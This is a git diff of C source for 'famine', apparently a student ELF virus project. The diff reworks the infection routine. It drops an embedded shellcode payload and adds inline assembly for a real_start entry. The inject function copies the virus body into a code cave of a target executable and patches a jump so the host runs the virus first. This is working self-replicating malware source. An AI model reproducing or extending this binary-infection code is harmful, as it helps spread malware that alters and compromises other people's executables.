@@ -16,23 +16,32 @@
 #endif
 
 extern void end();
-//extern void real_start();
+extern void real_start();
 void famine(void);
 
-
-char	g_payload[] = "\x52\xeb\x0f\x2e\x2e\x2e\x2e\x57\x4f\x4f\x44\x59\x2e\x2e\x2e\x2e\x0a\x00\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\xe0\xff\xff\xff\xba\x0f\x00\x00\x00\x0f\x05\x5a\xe9\xd0\xff\xff\xff";
-size_t	g_payload_size	= sizeof(g_payload) - 1;
-
-//#define JMP_OFFSET 4
-#define JMP_OFFSET 0xc
+#define JMP_OFFSET 0xc - 0x4
 #define JMP_SIZE 4
 
 void	_start(void)
 {
-	__asm__ volatile (	"pushfq\n" \
-						"call famine\n" \
-						"popfq\n" \
-						"jmp end\n");
+	//__asm__ volatile (	"pushfq\n" \
+	//					"push %rax\n" \
+	//					"push %rdx\n" \
+	//					"push %rsi\n" \
+	//					"push %rdi\n" \
+	//					"call famine\n" \
+	//					"pop %rdi\n" \
+	//					"pop %rsi\n" \
+	//					"pop %rdx\n" \
+	//					"pop %rax\n" \
+	//					"popf\n" \
+	//					"jmp end\n");
+	__asm__ (".global real_start\n"
+			"real_start:\n"
+			"push %rdx\n"
+			"call famine\n"
+			"pop %rdx\n"
+			"jmp end\n");
 
 }
 
@@ -80,32 +89,33 @@ static int	calculate_jmp(t_data *data) {
 //
 //	return 0;
 //}
-void modify_payload(int64_t value, size_t offset, size_t size, uint8_t *payload, size_t payload_size) {
-
-	for (size_t i = size; i > 0; i--) {
-		payload[payload_size - offset] = value & 0xFF;
-		value >>= 8;
-		offset--;
-	}
-}
+//void modify_payload(int64_t value, size_t offset, size_t size, uint8_t *payload, size_t payload_size) {
+//
+//	for (size_t i = size; i > 0; i--) {
+//		payload[payload_size - offset] = value & 0xFF;
+//		value >>= 8;
+//		offset--;
+//	}
+//}
 
 #define ALIGN_UP(x, a)	(((x) + (a) - 1) & ~((a) - 1))
 
 static int	inject(t_data *data) {
 	
-	unsigned long size = (unsigned long)&end - (unsigned long)&_start;
+	//unsigned long size = (unsigned long)&end - (unsigned long)&_start;
+	unsigned long size = (unsigned long)&end - (unsigned long)&real_start;
 
 
-	if (bss(data, size) == -1)
+	if (bss(data, size) == 1) {
 		return 1;
+	}
 
 
 	calculate_jmp(data);
 	//modify_payload(data->cave.rel_jmp, JMP_OFFSET, sizeof(data->cave.rel_jmp), (uint8_t *)g_payload, g_payload_size);
 
 	//ft_memcpy(data->file + data->cave.offset, g_payload, g_payload_size);
-	ft_memcpy(data->file + data->cave.offset, &_start, size);
-	
+	ft_memcpy(data->file + data->cave.offset, &real_start, size);
 
 
 	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);
